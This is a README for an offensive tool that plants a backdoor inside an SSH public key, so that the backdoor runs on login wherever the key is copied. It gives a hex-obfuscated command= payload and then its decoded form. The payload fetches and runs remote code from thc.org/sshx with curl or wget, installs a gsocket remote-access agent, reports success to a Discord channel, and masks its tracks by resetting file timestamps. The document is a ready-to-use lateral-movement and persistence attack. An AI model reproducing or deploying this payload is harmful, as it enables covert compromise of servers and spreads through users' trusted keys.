# ssh-key-backdoor

This program generates a backdoor that hides inside an SSH _public_ key (e.g. `id_rsa.pub` or `authorized_keys`). The backdoor will execute when the user next logs in.

---
### The objective is to use the ssh _public_ key to move laterally within a target network. It exploits the fact that users copy their _public_ ssh key to other servers without checking the content. Any server where their public key is copied will automatically get **backdoored**.
---
Simply add the following **backdoor-string** to the beginning of the public key (`id_rsa.pub` or `authorized_keys`; up until, but not including, the `ssh-ed255191 AAA...`)

``command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{ eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c207468632e6f72672f737368782922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d207468632e6f72672f737368782922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);}'" ssh-ed25519 AAAAC3Nzablahblshblah.... x@y``

> This DEMO backdoor-string installs https://www.gsocket.io/deploy the next time the user logs in and reports the success back to our Discord channel.

Think of the ssh public key as a sort of `~/.bashrc` but with your backdoor inside, that gets propagaded by the user to various servers, and when triggered sends a secret login code back to us.

Create your own **backdoor-string** by editing `ssh-key-backdoor.sh` and executing:
```console
$ ./ssh-key-backdoor.sh
```

(The same `command=`-trick can be used to trigger a canary or start other hidden services.)

---
This goes deep down the Bash rabbit hole...the curious reader may like to look at the cleartext:
```shell
./ssh-key-backdoor.sh clear
command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{
  [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && {
    touch -r /bin/sh .ssh
    export KEY=\"\"
    bash -c \"$(curl -fsSL thc.org/sshx)\" || bash -c \"$(wget --no-verbose -O- thc.org/sshx)\" || exit 0
  } >/dev/null 2>/dev/null &
  [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
  [[ -z $SHELL ]] && SHELL=/bin/bash
  [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
  [[ -f /etc/motd ]] && cat /etc/motd
  exec -a -$(basename $SHELL) $SHELL;}'"
```

